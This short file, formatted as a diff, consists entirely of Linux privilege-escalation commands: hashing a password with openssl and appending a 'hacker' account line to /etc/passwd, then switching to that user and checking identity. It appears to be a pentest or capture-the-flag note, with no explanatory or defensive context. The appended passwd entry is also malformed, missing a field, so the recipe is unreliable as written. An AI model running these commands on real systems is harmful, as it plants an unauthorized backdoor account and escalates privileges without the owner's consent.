@@ -1,0 +1,6 @@
+openssl passwd -1
+hacker123!
+$1$rEpLedwL$WT5S/vPBvb5iffqolKQaO1
+echo 'hacker:$1$rEpLedwL$WT5S/vPBvb5iffqolKQaO1:hacker:/home/hacker:/bin/bash' >> /etc/passwd
+su hacker
+id
